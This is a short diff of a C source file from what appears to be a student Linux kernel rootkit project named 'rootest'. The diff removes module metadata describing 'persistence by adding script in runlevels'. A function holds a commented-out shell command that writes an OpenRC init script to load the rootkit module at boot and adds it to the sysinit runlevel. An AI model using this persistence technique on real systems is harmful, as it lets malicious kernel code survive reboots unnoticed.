@@ -1,10 +1,5 @@
 #include "rootest.h"
 
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("2600 student");
-MODULE_DESCRIPTION("Persistence by adding script in runlevels");
-MODULE_VERSION("0.01");
-
 void persistence_runlevels(void)
 {
     //char *command = "echo -e \'#!/sbin/openrc-run\n\ndepend() {\n\tneed modules\n}\n\nstart() {\n\tebegin \"Loading mon_module\"\n\t/sbin/insmod /rootest.ko\n\teend \$?\n}\' > /etc/init.d/rootest && chmod +x /etc/init.d/rootest && cp /etc/init.d/rootest /etc/runlevels/sysinit/";
